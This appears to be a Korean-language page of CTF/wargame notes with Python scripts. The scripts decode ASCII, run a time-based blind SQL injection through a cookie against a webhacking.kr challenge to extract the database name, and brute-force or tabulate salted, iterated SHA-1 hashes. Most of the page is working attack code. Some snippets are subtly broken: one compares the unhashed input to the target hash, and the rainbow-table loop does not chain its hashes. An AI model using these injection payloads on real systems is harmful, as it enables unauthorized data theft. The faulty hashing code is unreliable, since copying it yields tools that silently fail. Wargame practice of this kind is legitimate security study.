# Script + Encryption with Python

## ASCII CODE 문자로 추출 - 1

```py
a = [107,117,100,111,115,95,116,111,95,98,101,111,116,108,97,98]
for i in a:
    print(chr(i), end ="")
```

## ASCII CODE 문자로 추출 - 2

```py
import requests

url = 'https://webhacking.kr/challenge/web-02/'
db = ''
bye = 0

for i in range(1,50):
    if bye == 1:
        break
    for j in range(33,133): # ascii 코드표 참고
        c = {"cookie":"PHPSESSID=fegrpl729j53avml7rsc02kbt5; time=0 or if(ord(substr((select database()),{},1))={},1,0)".format(i,j)}
        
        res = requests.get(url, cookies=c)
        #print("i : {}, j : {}".format(i, j))
        if res.text.find("09:00:01") != -1:
            db += chr(j)
            print(db)
            break
            # 문자열을 찾지 못하면 -1을 반환한다.
            # 참이면, 09:00:01로 1초를 반환하고 false일시 0초를 반환한다.
        if j == 132:
            # 마지막까지 갔다는 것은 db이름 끝까지 구해졌다는 의미이다.
            bye=1
            break
print("database : {}".format(db))
```

## SHA-1 사용된 salt 가 있는 해시 값으로 평문 값 알아내기 - 무식한 방법 무한 대입

```py
from hashlib import sha1
import random

while 1:
    hash = str(random.randint(10000000,99999999)) + "salt_for_you"
    tmp = hash
    for i in range(500):
        hash = sha1(hash.encode('utf-8')).hexdigest()
    
    if tmp == "4252795e1bfe0e49647a61fee4a5b2290251981f":
        print(tmp)
        break
```

```py
from hashlib import sha1
import random

t=1
while(t==1):
    thash = str(random.randint(10000000,99999999))+"salt_for_you"
    temp = thash
    for i in range(0,500):
        thash = sha1(thash.encode('utf-8')).hexdigest()
    
    if (thash == "48df44120d72fb68bc2748474c2e4cbc96edbc51"):
        print(temp)
        t=0
```

## SHA-1 레인보우 테이블 제작하기

```py
from hashlib import sha1

file = open("C:/Users/Desktop/raindow.txt", "w")

for i in range(10000000, 99999999):
    hash = str(i) + "salt_for_you"

    for j in range(500):
        string = sha1(hash.encode('utf-8')).hexdigest()

    file.write(str(i) + ' : ' + string[:8] + "\n")
    
file.close()
```